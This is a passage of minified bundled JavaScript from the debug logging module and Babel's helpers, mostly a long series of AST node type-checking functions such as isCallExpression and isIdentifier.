`+G),X.push(W+"m+"+JY.exports.humanize(this.diff)+"\x1B[0m")}else X[0]=sx()+Q+" "+X[0]}function sx(){if(ZZ.inspectOpts.hideDate)return"";return new Date().toISOString()+" "}function tx(...X){return process.stderr.write(QY.formatWithOptions(ZZ.inspectOpts,...X)+`
`)}function ex(X){if(X)process.env.DEBUG=X;else delete process.env.DEBUG}function Xf(){return process.env.DEBUG}function Qf(X){X.inspectOpts={};let Q=Object.keys(ZZ.inspectOpts);for(let J=0;J<Q.length;J++)X.inspectOpts[Q[J]]=ZZ.inspectOpts[Q[J]]}JY.exports=hH()(ZZ);var{formatters:qZ}=JY.exports;qZ.o=function(X){return this.inspectOpts.colors=this.useColors,QY.inspect(X,this.inspectOpts).split(`
`).map((Q)=>Q.trim()).join(" ")};qZ.O=function(X){return this.inspectOpts.colors=this.useColors,QY.inspect(X,this.inspectOpts)}});var FZ=m((Y60,mH)=>{if(typeof process>"u"||process.type==="renderer"||!1||process.__nwjs)mH.exports=$Z();else mH.exports=jZ()});var YY=m((OZ)=>{Object.defineProperty(OZ,"__esModule",{value:!0});OZ.default=Uf;function Uf(X,Q){let J=Object.keys(Q);for(let Y of J)if(X[Y]!==Q[Y])return!1;return!0}});var G5=m((RZ)=>{Object.defineProperty(RZ,"__esModule",{value:!0});RZ.default=Vf;var AZ=new Set;function Vf(X,Q,J="",Y=X){if(AZ.has(Y))return;AZ.add(Y);let{internal:W,trace:G}=Bf(1,2);if(W)return;console.warn(`${J}\`${X}\` has been deprecated, please migrate to \`${Q}\`
${G}`)}function Bf(X,Q){let{stackTraceLimit:J,prepareStackTrace:Y}=Error,W;if(Error.stackTraceLimit=1+X+Q,Error.prepareStackTrace=function(H,$){W=$},Error().stack,Error.stackTraceLimit=J,Error.prepareStackTrace=Y,!W)return{internal:!1,trace:""};let G=W.slice(1+X,1+X+Q);return{internal:/[\\/]@babel[\\/]/.test(G[1].getFileName()),trace:G.map((H)=>`    at ${H}`).join(`
`)}}});var d0=m((DZ)=>{Object.defineProperty(DZ,"__esModule",{value:!0});DZ.isAccessor=ku;DZ.isAnyTypeAnnotation=oh;DZ.isArgumentPlaceholder=Ig;DZ.isArrayExpression=Zf;DZ.isArrayPattern=qh;DZ.isArrayTypeAnnotation=sh;DZ.isArrowFunctionExpression=Zh;DZ.isAssignmentExpression=Mf;DZ.isAssignmentPattern=Bh;DZ.isAwaitExpression=hh;DZ.isBigIntLiteral=gh;DZ.isBinary=Xu;DZ.isBinaryExpression=jf;DZ.isBindExpression=Cg;DZ.isBlock=Yu;DZ.isBlockParent=Ju;DZ.isBlockStatement=Rf;DZ.isBooleanLiteral=uf;DZ.isBooleanLiteralTypeAnnotation=eh;DZ.isBooleanTypeAnnotation=th;DZ.isBreakStatement=Lf;DZ.isCallExpression=Df;DZ.isCatchClause=Nf;DZ.isClass=Eu;DZ.isClassAccessorProperty=ph;DZ.isClassBody=Mh;DZ.isClassDeclaration=Fh;DZ.isClassExpression=jh;DZ.isClassImplements=Qy;DZ.isClassMethod=Eh;DZ.isClassPrivateMethod=ih;DZ.isClassPrivateProperty=dh;DZ.isClassProperty=lh;DZ.isCompletionStatement=Hu;DZ.isConditional=$u;DZ.isConditionalExpression=wf;DZ.isContinueStatement=If;DZ.isDebuggerStatement=Cf;DZ.isDecimalLiteral=kg;DZ.isDeclaration=ju;DZ.isDeclareClass=Jy;DZ.isDeclareExportAllDeclaration=Vy;DZ.isDeclareExportDeclaration=Ky;DZ.isDeclareFunction=Yy;DZ.isDeclareInterface=Wy;DZ.isDeclareModule=Gy;DZ.isDeclareModuleExports=Hy;DZ.isDeclareOpaqueType=zy;DZ.isDeclareTypeAlias=$y;DZ.isDeclareVariable=Uy;DZ.isDeclaredPredicate=By;DZ.isDecorator=Pg;DZ.isDirective=Of;DZ.isDirectiveLiteral=Af;DZ.isDoExpression=Sg;DZ.isDoWhileStatement=Pf;DZ.isEmptyStatement=Sf;DZ.isEmptyTypeAnnotation=Ny;DZ.isEnumBody=gu;DZ.isEnumBooleanBody=sy;DZ.isEnumBooleanMember=Qg;DZ.isEnumDeclaration=oy;DZ.isEnumDefaultedMember=Wg;DZ.isEnumMember=mu;DZ.isEnumNumberBody=ty;DZ.isEnumNumberMember=Jg;DZ.isEnumStringBody=ey;DZ.isEnumStringMember=Yg;DZ.isEnumSymbolBody=Xg;DZ.isExistsTypeAnnotation=qy;DZ.isExportAllDeclaration=Oh;DZ.isExportDeclaration=Tu;DZ.isExportDefaultDeclaration=Ah;DZ.isExportDefaultSpecifier=Eg;DZ.isExportNamedDeclaration=Rh;DZ.isExportNamespaceSpecifier=mh;DZ.isExportSpecifier=Lh;DZ.isExpression=em;DZ.isExpressionStatement=Ef;DZ.isExpressionWrapper=Ku;DZ.isFile=Tf;DZ.isFlow=vu;DZ.isFlowBaseAnnotation=fu;DZ.isFlowDeclaration=hu;DZ.isFlowPredicate=yu;DZ.isFlowType=xu;DZ.isFor=Vu;DZ.isForInStatement=_f;DZ.isForOfStatement=Dh;DZ.isForStatement=kf;DZ.isForXStatement=Bu;DZ.isFunction=qu;DZ.isFunctionDeclaration=bf;DZ.isFunctionExpression=vf;DZ.isFunctionParameter=Fu;DZ.isFunctionParent=Zu;DZ.isFunctionTypeAnnotation=Zy;DZ.isFunctionTypeParam=My;DZ.isGenericTypeAnnotation=jy;DZ.isIdentifier=xf;DZ.isIfStatement=ff;DZ.isImmutable=Du;DZ.isImport=yh;DZ.isImportAttribute=ah;DZ.isImportDeclaration=Nh;DZ.isImportDefaultSpecifier=wh;DZ.isImportExpression=Ph;DZ.isImportNamespaceSpecifier=Ih;DZ.isImportOrExportDeclaration=LZ;DZ.isImportSpecifier=Ch;DZ.isIndexedAccessType=Gg;DZ.isInferredPredicate=Fy;DZ.isInterfaceDeclaration=Ay;DZ.isInterfaceExtends=Oy;DZ.isInterfaceTypeAnnotation=Ry;DZ.isInterpreterDirective=Ff;DZ.isIntersectionTypeAnnotation=Ly;DZ.isJSX=uu;DZ.isJSXAttribute=$g;DZ.isJSXClosingElement=zg;DZ.isJSXClosingFragment=Lg;DZ.isJSXElement=Ug;DZ.isJSXEmptyExpression=Kg;DZ.isJSXExpressionContainer=Vg;DZ.isJSXFragment=Ag;DZ.isJSXIdentifier=qg;DZ.isJSXMemberExpression=Zg;DZ.isJSXNamespacedName=Mg;DZ.isJSXOpeningElement=jg;DZ.isJSXOpeningFragment=Rg;DZ.isJSXSpreadAttribute=Fg;DZ.isJSXSpreadChild=Bg;DZ.isJSXText=Og;DZ.isLVal=Au;DZ.isLabeledStatement=hf;DZ.isLiteral=Lu;DZ.isLogicalExpression=lf;DZ.isLoop=zu;DZ.isMemberExpression=pf;DZ.isMetaProperty=Sh;DZ.isMethod=wu;DZ.isMiscellaneous=cu;DZ.isMixedTypeAnnotation=Dy;DZ.isModuleDeclaration=su;DZ.isModuleExpression=bg;DZ.isModuleSpecifier=_u;DZ.isNewExpression=df;DZ.isNoop=Dg;DZ.isNullLiteral=mf;DZ.isNullLiteralTypeAnnotation=Xy;DZ.isNullableTypeAnnotation=wy;DZ.isNumberLiteral=ru;DZ.isNumberLiteralTypeAnnotation=Iy;DZ.isNumberTypeAnnotation=Cy;DZ.isNumericLiteral=gf;DZ.isObjectExpression=nf;DZ.isObjectMember=Iu;DZ.isObjectMethod=af;DZ.isObjectPattern=Th;DZ.isObjectProperty=of;DZ.isObjectTypeAnnotation=Py;DZ.isObjectTypeCallProperty=Ey;DZ.isObjectTypeIndexer=Ty;DZ.isObjectTypeInternalSlot=Sy;DZ.isObjectTypeProperty=_y;DZ.isObjectTypeSpreadProperty=ky;DZ.isOpaqueType=by;DZ.isOptionalCallExpression=ch;DZ.isOptionalIndexedAccessType=Hg;DZ.isOptionalMemberExpression=uh;DZ.isParenthesizedExpression=Xh;DZ.isPattern=Su;DZ.isPatternLike=Ou;DZ.isPipelineBareFunction=fg;DZ.isPipelinePrimaryTopicReference=hg;DZ.isPipelineTopicExpression=xg;DZ.isPlaceholder=Ng;DZ.isPrivate=bu;DZ.isPrivateName=rh;DZ.isProgram=rf;DZ.isProperty=Cu;DZ.isPureish=Mu;DZ.isQualifiedTypeIdentifier=vy;DZ.isRecordExpression=Tg;DZ.isRegExpLiteral=cf;DZ.isRegexLiteral=nu;DZ.isRestElement=sf;DZ.isRestProperty=au;DZ.isReturnStatement=tf;DZ.isScopable=Qu;DZ.isSequenceExpression=ef;DZ.isSpreadElement=_h;DZ.isSpreadProperty=ou;DZ.isStandardized=tm;DZ.isStatement=Wu;DZ.isStaticBlock=nh;DZ.isStringLiteral=yf;DZ.isStringLiteralTypeAnnotation=xy;DZ.isStringTypeAnnotation=fy;DZ.isSuper=kh;DZ.isSwitchCase=Qh;DZ.isSwitchStatement=Jh;DZ.isSymbolTypeAnnotation=hy;DZ.isTSAnyKeyword=ng;DZ.isTSArrayType=Zm;DZ.isTSAsExpression=vm;DZ.isTSBaseType=iu;DZ.isTSBigIntKeyword=og;DZ.isTSBooleanKeyword=ag;DZ.isTSCallSignatureDeclaration=lg;DZ.isTSConditionalType=Lm;DZ.isTSConstructSignatureDeclaration=pg;DZ.isTSConstructorType=Um;DZ.isTSDeclareFunction=mg;DZ.isTSDeclareMethod=ug;DZ.isTSEntityName=Ru;DZ.isTSEnumBody=hm;DZ.isTSEnumDeclaration=ym;DZ.isTSEnumMember=gm;DZ.isTSExportAssignment=im;DZ.isTSExpressionWithTypeArguments=Em;DZ.isTSExternalModuleReference=pm;DZ.isTSFunctionType=zm;DZ.isTSImportEqualsDeclaration=lm;DZ.isTSImportType=cm;DZ.isTSIndexSignature=rg;DZ.isTSIndexedAccessType=Im;DZ.isTSInferType=Dm;DZ.isTSInstantiationExpression=bm;DZ.isTSInterfaceBody=_m;DZ.isTSInterfaceDeclaration=Tm;DZ.isTSIntersectionType=Rm;DZ.isTSIntrinsicKeyword=sg;DZ.isTSLiteralType=Sm;DZ.isTSMappedType=Cm;DZ.isTSMethodSignature=ig;DZ.isTSModuleBlock=um;DZ.isTSModuleDeclaration=mm;DZ.isTSNamedTupleMember=Om;DZ.isTSNamespaceExportDeclaration=rm;DZ.isTSNeverKeyword=tg;DZ.isTSNonNullExpression=dm;DZ.isTSNullKeyword=eg;DZ.isTSNumberKeyword=Xm;DZ.isTSObjectKeyword=Qm;DZ.isTSOptionalType=jm;DZ.isTSParameterProperty=gg;DZ.isTSParenthesizedType=Nm;DZ.isTSPropertySignature=dg;DZ.isTSQualifiedName=cg;DZ.isTSRestType=Fm;DZ.isTSSatisfiesExpression=xm;DZ.isTSStringKeyword=Jm;DZ.isTSSymbolKeyword=Ym;DZ.isTSTemplateLiteralType=Pm;DZ.isTSThisType=$m;DZ.isTSTupleType=Mm;DZ.isTSType=du;DZ.isTSTypeAliasDeclaration=km;DZ.isTSTypeAnnotation=nm;DZ.isTSTypeAssertion=fm;DZ.isTSTypeElement=pu;DZ.isTSTypeLiteral=qm;DZ.isTSTypeOperator=wm;DZ.isTSTypeParameter=sm;DZ.isTSTypeParameterDeclaration=om;DZ.isTSTypeParameterInstantiation=am;DZ.isTSTypePredicate=Vm;DZ.isTSTypeQuery=Bm;DZ.isTSTypeReference=Km;DZ.isTSUndefinedKeyword=Wm;DZ.isTSUnionType=Am;DZ.isTSUnknownKeyword=Gm;DZ.isTSVoidKeyword=Hm;DZ.isTaggedTemplateExpression=bh;DZ.isTemplateElement=vh;DZ.isTemplateLiteral=xh;DZ.isTerminatorless=Gu;DZ.isThisExpression=Yh;DZ.isThisTypeAnnotation=yy;DZ.isThrowStatement=Wh;DZ.isTopicReference=vg;DZ.isTryStatement=Gh;DZ.isTupleExpression=_g;DZ.isTupleTypeAnnotation=gy;DZ.isTypeAlias=uy;DZ.isTypeAnnotation=cy;DZ.isTypeCastExpression=ly;DZ.isTypeParameter=py;DZ.isTypeParameterDeclaration=dy;DZ.isTypeParameterInstantiation=iy;DZ.isTypeScript=lu;DZ.isTypeofTypeAnnotation=my;DZ.isUnaryExpression=Hh;DZ.isUnaryLike=Pu;DZ.isUnionTypeAnnotation=ry;DZ.isUpdateExpression=$h;DZ.isUserWhitespacable=Nu;DZ.isV8IntrinsicIdentifier=wg;DZ.isVariableDeclaration=zh;DZ.isVariableDeclarator=Uh;DZ.isVariance=ny;DZ.isVoidPattern=yg;DZ.isVoidTypeAnnotation=ay;DZ.isWhile=Uu;DZ.isWhileStatement=Kh;DZ.isWithStatement=Vh;DZ.isYieldExpression=fh;var S=YY(),x4=G5();function Zf(X,Q){if(!X)return!1;if(X.type!=="ArrayExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Mf(X,Q){if(!X)return!1;if(X.type!=="AssignmentExpression")return!1;return Q==null||(0,S.default)(X,Q)}function jf(X,Q){if(!X)return!1;if(X.type!=="BinaryExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Ff(X,Q){if(!X)return!1;if(X.type!=="InterpreterDirective")return!1;return Q==null||(0,S.default)(X,Q)}function Of(X,Q){if(!X)return!1;if(X.type!=="Directive")return!1;return Q==null||(0,S.default)(X,Q)}function Af(X,Q){if(!X)return!1;if(X.type!=="DirectiveLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function Rf(X,Q){if(!X)return!1;if(X.type!=="BlockStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Lf(X,Q){if(!X)return!1;if(X.type!=="BreakStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Df(X,Q){if(!X)return!1;if(X.type!=="CallExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Nf(X,Q){if(!X)return!1;if(X.type!=="CatchClause")return!1;return Q==null||(0,S.default)(X,Q)}function wf(X,Q){if(!X)return!1;if(X.type!=="ConditionalExpression")return!1;return Q==null||(0,S.default)(X,Q)}function If(X,Q){if(!X)return!1;if(X.type!=="ContinueStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Cf(X,Q){if(!X)return!1;if(X.type!=="DebuggerStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Pf(X,Q){if(!X)return!1;if(X.type!=="DoWhileStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Sf(X,Q){if(!X)return!1;if(X.type!=="EmptyStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Ef(X,Q){if(!X)return!1;if(X.type!=="ExpressionStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Tf(X,Q){if(!X)return!1;if(X.type!=="File")return!1;return Q==null||(0,S.default)(X,Q)}function _f(X,Q){if(!X)return!1;if(X.type!=="ForInStatement")return!1;return Q==null||(0,S.default)(X,Q)}function kf(X,Q){if(!X)return!1;if(X.type!=="ForStatement")return!1;return Q==null||(0,S.default)(X,Q)}function bf(X,Q){if(!X)return!1;if(X.type!=="FunctionDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function vf(X,Q){if(!X)return!1;if(X.type!=="FunctionExpression")return!1;return Q==null||(0,S.default)(X,Q)}function xf(X,Q){if(!X)return!1;if(X.type!=="Identifier")return!1;return Q==null||(0,S.default)(X,Q)}function ff(X,Q){if(!X)return!1;if(X.type!=="IfStatement")return!1;return Q==null||(0,S.default)(X,Q)}function hf(X,Q){if(!X)return!1;if(X.type!=="LabeledStatement")return!1;return Q==null||(0,S.default)(X,Q)}function yf(X,Q){if(!X)return!1;if(X.type!=="StringLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function gf(X,Q){if(!X)return!1;if(X.type!=="NumericLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function mf(X,Q){if(!X)return!1;if(X.type!=="NullLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function uf(X,Q){if(!X)return!1;if(X.type!=="BooleanLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function cf(X,Q){if(!X)return!1;if(X.type!=="RegExpLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function lf(X,Q){if(!X)return!1;if(X.type!=="LogicalExpression")return!1;return Q==null||(0,S.default)(X,Q)}function pf(X,Q){if(!X)return!1;if(X.type!=="MemberExpression")return!1;return Q==null||(0,S.default)(X,Q)}function df(X,Q){if(!X)return!1;if(X.type!=="NewExpression")return!1;return Q==null||(0,S.default)(X,Q)}function rf(X,Q){if(!X)return!1;if(X.type!=="Program")return!1;return Q==null||(0,S.default)(X,Q)}function nf(X,Q){if(!X)return!1;if(X.type!=="ObjectExpression")return!1;return Q==null||(0,S.default)(X,Q)}function af(X,Q){if(!X)return!1;if(X.type!=="ObjectMethod")return!1;return Q==null||(0,S.default)(X,Q)}function of(X,Q){if(!X)return!1;if(X.type!=="ObjectProperty")return!1;return Q==null||(0,S.default)(X,Q)}function sf(X,Q){if(!X)return!1;if(X.type!=="RestElement")return!1;return Q==null||(0,S.default)(X,Q)}function tf(X,Q){if(!X)return!1;if(X.type!=="ReturnStatement")return!1;return Q==null||(0,S.default)(X,Q)}function ef(X,Q){if(!X)return!1;if(X.type!=="SequenceExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Xh(X,Q){if(!X)return!1;if(X.type!=="ParenthesizedExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Qh(X,Q){if(!X)return!1;if(X.type!=="SwitchCase")return!1;return Q==null||(0,S.default)(X,Q)}function Jh(X,Q){if(!X)return!1;if(X.type!=="SwitchStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Yh(X,Q){if(!X)return!1;if(X.type!=="ThisExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Wh(X,Q){if(!X)return!1;if(X.type!=="ThrowStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Gh(X,Q){if(!X)return!1;if(X.type!=="TryStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Hh(X,Q){if(!X)return!1;if(X.type!=="UnaryExpression")return!1;return Q==null||(0,S.default)(X,Q)}function $h(X,Q){if(!X)return!1;if(X.type!=="UpdateExpression")return!1;return Q==null||(0,S.default)(X,Q)}function zh(X,Q){if(!X)return!1;if(X.type!=="VariableDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function Uh(X,Q){if(!X)return!1;if(X.type!=="VariableDeclarator")return!1;return Q==null||(0,S.default)(X,Q)}function Kh(X,Q){if(!X)return!1;if(X.type!=="WhileStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Vh(X,Q){if(!X)return!1;if(X.type!=="WithStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Bh(X,Q){if(!X)return!1;if(X.type!=="AssignmentPattern")return!1;return Q==null||(0,S.default)(X,Q)}function qh(X,Q){if(!X)return!1;if(X.type!=="ArrayPattern")return!1;return Q==null||(0,S.default)(X,Q)}function Zh(X,Q){if(!X)return!1;if(X.type!=="ArrowFunctionExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Mh(X,Q){if(!X)return!1;if(X.type!=="ClassBody")return!1;return Q==null||(0,S.default)(X,Q)}function jh(X,Q){if(!X)return!1;if(X.type!=="ClassExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Fh(X,Q){if(!X)return!1;if(X.type!=="ClassDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function Oh(X,Q){if(!X)return!1;if(X.type!=="ExportAllDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function Ah(X,Q){if(!X)return!1;if(X.type!=="ExportDefaultDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function Rh(X,Q){if(!X)return!1;if(X.type!=="ExportNamedDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function Lh(X,Q){if(!X)return!1;if(X.type!=="ExportSpecifier")return!1;return Q==null||(0,S.default)(X,Q)}function Dh(X,Q){if(!X)return!1;if(X.type!=="ForOfStatement")return!1;return Q==null||(0,S.default)(X,Q)}function Nh(X,Q){if(!X)return!1;if(X.type!=="ImportDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function wh(X,Q){if(!X)return!1;if(X.type!=="ImportDefaultSpecifier")return!1;return Q==null||(0,S.default)(X,Q)}function Ih(X,Q){if(!X)return!1;if(X.type!=="ImportNamespaceSpecifier")return!1;return Q==null||(0,S.default)(X,Q)}function Ch(X,Q){if(!X)return!1;if(X.type!=="ImportSpecifier")return!1;return Q==null||(0,S.default)(X,Q)}function Ph(X,Q){if(!X)return!1;if(X.type!=="ImportExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Sh(X,Q){if(!X)return!1;if(X.type!=="MetaProperty")return!1;return Q==null||(0,S.default)(X,Q)}function Eh(X,Q){if(!X)return!1;if(X.type!=="ClassMethod")return!1;return Q==null||(0,S.default)(X,Q)}function Th(X,Q){if(!X)return!1;if(X.type!=="ObjectPattern")return!1;return Q==null||(0,S.default)(X,Q)}function _h(X,Q){if(!X)return!1;if(X.type!=="SpreadElement")return!1;return Q==null||(0,S.default)(X,Q)}function kh(X,Q){if(!X)return!1;if(X.type!=="Super")return!1;return Q==null||(0,S.default)(X,Q)}function bh(X,Q){if(!X)return!1;if(X.type!=="TaggedTemplateExpression")return!1;return Q==null||(0,S.default)(X,Q)}function vh(X,Q){if(!X)return!1;if(X.type!=="TemplateElement")return!1;return Q==null||(0,S.default)(X,Q)}function xh(X,Q){if(!X)return!1;if(X.type!=="TemplateLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function fh(X,Q){if(!X)return!1;if(X.type!=="YieldExpression")return!1;return Q==null||(0,S.default)(X,Q)}function hh(X,Q){if(!X)return!1;if(X.type!=="AwaitExpression")return!1;return Q==null||(0,S.default)(X,Q)}function yh(X,Q){if(!X)return!1;if(X.type!=="Import")return!1;return Q==null||(0,S.default)(X,Q)}function gh(X,Q){if(!X)return!1;if(X.type!=="BigIntLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function mh(X,Q){if(!X)return!1;if(X.type!=="ExportNamespaceSpecifier")return!1;return Q==null||(0,S.default)(X,Q)}function uh(X,Q){if(!X)return!1;if(X.type!=="OptionalMemberExpression")return!1;return Q==null||(0,S.default)(X,Q)}function ch(X,Q){if(!X)return!1;if(X.type!=="OptionalCallExpression")return!1;return Q==null||(0,S.default)(X,Q)}function lh(X,Q){if(!X)return!1;if(X.type!=="ClassProperty")return!1;return Q==null||(0,S.default)(X,Q)}function ph(X,Q){if(!X)return!1;if(X.type!=="ClassAccessorProperty")return!1;return Q==null||(0,S.default)(X,Q)}function dh(X,Q){if(!X)return!1;if(X.type!=="ClassPrivateProperty")return!1;return Q==null||(0,S.default)(X,Q)}function ih(X,Q){if(!X)return!1;if(X.type!=="ClassPrivateMethod")return!1;return Q==null||(0,S.default)(X,Q)}function rh(X,Q){if(!X)return!1;if(X.type!=="PrivateName")return!1;return Q==null||(0,S.default)(X,Q)}function nh(X,Q){if(!X)return!1;if(X.type!=="StaticBlock")return!1;return Q==null||(0,S.default)(X,Q)}function ah(X,Q){if(!X)return!1;if(X.type!=="ImportAttribute")return!1;return Q==null||(0,S.default)(X,Q)}function oh(X,Q){if(!X)return!1;if(X.type!=="AnyTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function sh(X,Q){if(!X)return!1;if(X.type!=="ArrayTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function th(X,Q){if(!X)return!1;if(X.type!=="BooleanTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function eh(X,Q){if(!X)return!1;if(X.type!=="BooleanLiteralTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Xy(X,Q){if(!X)return!1;if(X.type!=="NullLiteralTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Qy(X,Q){if(!X)return!1;if(X.type!=="ClassImplements")return!1;return Q==null||(0,S.default)(X,Q)}function Jy(X,Q){if(!X)return!1;if(X.type!=="DeclareClass")return!1;return Q==null||(0,S.default)(X,Q)}function Yy(X,Q){if(!X)return!1;if(X.type!=="DeclareFunction")return!1;return Q==null||(0,S.default)(X,Q)}function Wy(X,Q){if(!X)return!1;if(X.type!=="DeclareInterface")return!1;return Q==null||(0,S.default)(X,Q)}function Gy(X,Q){if(!X)return!1;if(X.type!=="DeclareModule")return!1;return Q==null||(0,S.default)(X,Q)}function Hy(X,Q){if(!X)return!1;if(X.type!=="DeclareModuleExports")return!1;return Q==null||(0,S.default)(X,Q)}function $y(X,Q){if(!X)return!1;if(X.type!=="DeclareTypeAlias")return!1;return Q==null||(0,S.default)(X,Q)}function zy(X,Q){if(!X)return!1;if(X.type!=="DeclareOpaqueType")return!1;return Q==null||(0,S.default)(X,Q)}function Uy(X,Q){if(!X)return!1;if(X.type!=="DeclareVariable")return!1;return Q==null||(0,S.default)(X,Q)}function Ky(X,Q){if(!X)return!1;if(X.type!=="DeclareExportDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function Vy(X,Q){if(!X)return!1;if(X.type!=="DeclareExportAllDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function By(X,Q){if(!X)return!1;if(X.type!=="DeclaredPredicate")return!1;return Q==null||(0,S.default)(X,Q)}function qy(X,Q){if(!X)return!1;if(X.type!=="ExistsTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Zy(X,Q){if(!X)return!1;if(X.type!=="FunctionTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function My(X,Q){if(!X)return!1;if(X.type!=="FunctionTypeParam")return!1;return Q==null||(0,S.default)(X,Q)}function jy(X,Q){if(!X)return!1;if(X.type!=="GenericTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Fy(X,Q){if(!X)return!1;if(X.type!=="InferredPredicate")return!1;return Q==null||(0,S.default)(X,Q)}function Oy(X,Q){if(!X)return!1;if(X.type!=="InterfaceExtends")return!1;return Q==null||(0,S.default)(X,Q)}function Ay(X,Q){if(!X)return!1;if(X.type!=="InterfaceDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function Ry(X,Q){if(!X)return!1;if(X.type!=="InterfaceTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Ly(X,Q){if(!X)return!1;if(X.type!=="IntersectionTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Dy(X,Q){if(!X)return!1;if(X.type!=="MixedTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Ny(X,Q){if(!X)return!1;if(X.type!=="EmptyTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function wy(X,Q){if(!X)return!1;if(X.type!=="NullableTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Iy(X,Q){if(!X)return!1;if(X.type!=="NumberLiteralTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Cy(X,Q){if(!X)return!1;if(X.type!=="NumberTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Py(X,Q){if(!X)return!1;if(X.type!=="ObjectTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function Sy(X,Q){if(!X)return!1;if(X.type!=="ObjectTypeInternalSlot")return!1;return Q==null||(0,S.default)(X,Q)}function Ey(X,Q){if(!X)return!1;if(X.type!=="ObjectTypeCallProperty")return!1;return Q==null||(0,S.default)(X,Q)}function Ty(X,Q){if(!X)return!1;if(X.type!=="ObjectTypeIndexer")return!1;return Q==null||(0,S.default)(X,Q)}function _y(X,Q){if(!X)return!1;if(X.type!=="ObjectTypeProperty")return!1;return Q==null||(0,S.default)(X,Q)}function ky(X,Q){if(!X)return!1;if(X.type!=="ObjectTypeSpreadProperty")return!1;return Q==null||(0,S.default)(X,Q)}function by(X,Q){if(!X)return!1;if(X.type!=="OpaqueType")return!1;return Q==null||(0,S.default)(X,Q)}function vy(X,Q){if(!X)return!1;if(X.type!=="QualifiedTypeIdentifier")return!1;return Q==null||(0,S.default)(X,Q)}function xy(X,Q){if(!X)return!1;if(X.type!=="StringLiteralTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function fy(X,Q){if(!X)return!1;if(X.type!=="StringTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function hy(X,Q){if(!X)return!1;if(X.type!=="SymbolTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function yy(X,Q){if(!X)return!1;if(X.type!=="ThisTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function gy(X,Q){if(!X)return!1;if(X.type!=="TupleTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function my(X,Q){if(!X)return!1;if(X.type!=="TypeofTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function uy(X,Q){if(!X)return!1;if(X.type!=="TypeAlias")return!1;return Q==null||(0,S.default)(X,Q)}function cy(X,Q){if(!X)return!1;if(X.type!=="TypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function ly(X,Q){if(!X)return!1;if(X.type!=="TypeCastExpression")return!1;return Q==null||(0,S.default)(X,Q)}function py(X,Q){if(!X)return!1;if(X.type!=="TypeParameter")return!1;return Q==null||(0,S.default)(X,Q)}function dy(X,Q){if(!X)return!1;if(X.type!=="TypeParameterDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function iy(X,Q){if(!X)return!1;if(X.type!=="TypeParameterInstantiation")return!1;return Q==null||(0,S.default)(X,Q)}function ry(X,Q){if(!X)return!1;if(X.type!=="UnionTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function ny(X,Q){if(!X)return!1;if(X.type!=="Variance")return!1;return Q==null||(0,S.default)(X,Q)}function ay(X,Q){if(!X)return!1;if(X.type!=="VoidTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function oy(X,Q){if(!X)return!1;if(X.type!=="EnumDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function sy(X,Q){if(!X)return!1;if(X.type!=="EnumBooleanBody")return!1;return Q==null||(0,S.default)(X,Q)}function ty(X,Q){if(!X)return!1;if(X.type!=="EnumNumberBody")return!1;return 